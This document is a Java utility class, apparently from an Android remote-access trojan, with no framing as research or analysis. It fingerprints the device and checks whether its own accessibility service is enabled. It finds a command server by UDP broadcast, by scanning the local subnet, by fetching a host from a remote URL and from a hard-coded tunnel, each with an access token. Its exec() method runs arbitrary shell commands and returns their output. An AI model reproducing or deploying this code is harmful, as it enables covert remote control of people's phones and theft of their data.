package com.aval.seg;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public final class Util {

    public static String dev(Context c) {
        int bat = -1;
        try {
            BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
            bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Throwable ignored) {}
        int w = 0, h = 0;
        try {
            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            w = dm.widthPixels;
            h = dm.heightPixels;
        } catch (Throwable ignored) {}
        return "\"m\":\"" + esc(Build.MANUFACTURER + " " + Build.MODEL) + "\",\"sdk\":" +
                Build.VERSION.SDK_INT + ",\"bat\":" + bat + ",\"w\":" + w + ",\"h\":" + h +
                ",\"ip\":\"" + ip() + "\"";
    }

    public static String ip() {
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (!ni.isUp() || ni.isLoopback()) continue;
                for (InetAddress a : Collections.list(ni.getInetAddresses()))
                    if (a instanceof Inet4Address) return a.getHostAddress();
            }
        } catch (Throwable ignored) {}
        return "?";
    }

    public static String screen(Context c) {
        try {
            WindowManager wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            return dm.widthPixels + "x" + dm.heightPixels + "@" + dm.densityDpi;
        } catch (Throwable t) {
            return "?";
        }
    }

    public static boolean accOn(Context c) {
        try {
            String s = Settings.Secure.getString(c.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(c.getPackageName());
        } catch (Throwable t) { return false; }
    }

    private static String broadcast() {
        DatagramSocket s = null;
        try {
            s = new DatagramSocket();
            s.setBroadcast(true);
            s.setSoTimeout(1500);
            byte[] msg = "AVAL".getBytes();
            s.send(new DatagramPacket(msg, msg.length,
                    InetAddress.getByName("255.255.255.255"), Cfg.DISC));
            byte[] buf = new byte[160];
            DatagramPacket p = new DatagramPacket(buf, buf.length);
            s.receive(p);
            String u = new String(buf, 0, p.getLength()).trim();
            if (u.startsWith("ws://") || u.startsWith("wss://")) return u;
        } catch (Throwable ignored) {
        } finally {
            try { if (s != null) s.close(); } catch (Throwable ignored) {}
        }
        return null;
    }

    private static String scan() {
        String my = ip();
        int dot = my.lastIndexOf('.');
        if (dot < 0) return null;
        final String base = my.substring(0, dot) + ".";
        final AtomicReference<String> hit = new AtomicReference<>();
        ExecutorService ex = Executors.newFixedThreadPool(24);
        for (int i = 1; i < 255; i++) {
            final int n = i;
            ex.execute(() -> {
                if (hit.get() != null) return;
                Socket s = null;
                try {
                    s = new Socket();
                    s.connect(new InetSocketAddress(base + n, Cfg.PORT), 350);
                    hit.compareAndSet(null, "ws://" + base + n + ":" + Cfg.PORT + "/ws?t=" + Cfg.TOKEN);
                } catch (Throwable ignored) {
                } finally {
                    try { if (s != null) s.close(); } catch (Throwable ignored) {}
                }
            });
        }
        ex.shutdown();
        try { ex.awaitTermination(7, TimeUnit.SECONDS); } catch (Throwable ignored) {}
        return hit.get();
    }

    private static String remoto(Context c) {
        long agora = System.currentTimeMillis();
        String cache = c.getSharedPreferences("p", 0).getString("host", null);
        long t = c.getSharedPreferences("p", 0).getLong("hostT", 0);
        if (cache != null && agora - t < 20000) return "wss://" + cache + "/ws?t=" + Cfg.TOKEN;
        try {
            HttpURLConnection h = (HttpURLConnection) new URL(Cfg.RAW + "?x=" + agora).openConnection();
            h.setConnectTimeout(6000);
            h.setReadTimeout(6000);
            h.setUseCaches(false);
            BufferedReader r = new BufferedReader(new InputStreamReader(h.getInputStream()));
            String l = r.readLine();
            r.close();
            if (l != null) {
                l = l.trim();
                if (l.startsWith("ws://") || l.startsWith("wss://")) return l;
                if (l.length() > 5) {
                    c.getSharedPreferences("p", 0).edit().putString("host", l).putLong("hostT", agora).apply();
                    return "wss://" + l + "/ws?t=" + Cfg.TOKEN;
                }
            }
        } catch (Throwable ignored) {}
        if (cache != null) return "wss://" + cache + "/ws?t=" + Cfg.TOKEN;
        return null;
    }

    public static List<String> candidates(Context c) {
        List<String> out = new ArrayList<>();
        String last = c.getSharedPreferences("p", 0).getString("url", null);
        if (last != null && last.length() > 8) out.add(last);

        String remoto = remoto(c);
        if (remoto != null && !out.contains(remoto)) out.add(remoto);

        String d = broadcast();
        if (d != null && !out.contains(d)) out.add(d);

        if (Cfg.TUNNEL.length() > 4) {
            String a = "wss://" + Cfg.TUNNEL + "/ws?t=" + Cfg.TOKEN;
            String b = "https://" + Cfg.TUNNEL + "/ws?t=" + Cfg.TOKEN;
            if (!out.contains(a)) out.add(a);
            if (!out.contains(b)) out.add(b);
        }
        return out;
    }

    public static void remember(Context c, String url) {
        try { c.getSharedPreferences("p", 0).edit().putString("url", url).apply(); }
        catch (Throwable ignored) {}
    }

    public static String exec(String cmd) {
        StringBuilder out = new StringBuilder();
        try {
            Process p = new ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while ((l = r.readLine()) != null) out.append(l).append('\n');
            p.waitFor();
        } catch (Throwable t) { out.append("err: ").append(t); }
        String s = out.toString();
        return s.length() > 20000 ? s.substring(0, 20000) : s;
    }

    public static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }
}